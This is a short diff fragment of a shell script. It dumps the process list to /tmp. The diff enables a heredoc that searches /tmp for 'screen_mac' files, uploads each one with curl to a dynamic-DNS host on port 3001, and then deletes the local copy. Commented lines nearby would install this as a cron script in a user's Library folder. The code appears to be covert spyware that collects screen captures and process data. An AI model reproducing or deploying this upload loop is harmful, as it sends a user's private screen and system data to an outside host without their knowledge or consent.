@@ -10,13 +10,13 @@ ps -ef > /tmp/screen_mac_000_psef.txt
 #  rm $file 
 #done
 
-#read -r -d '' SCRCAP_KK << EOM2
-#find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
-#  echo "uploading $file"
-#  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
-#  rm $file
-#done
-#EOM2
+read -r -d '' SCRCAP_KK << EOM2
+find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
+  echo "uploading \$file"
+  curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file || break
+  rm \$file
+done
+EOM2
 
 #echo "$SCRCAP_KK" > /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
 #chmod 755 /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
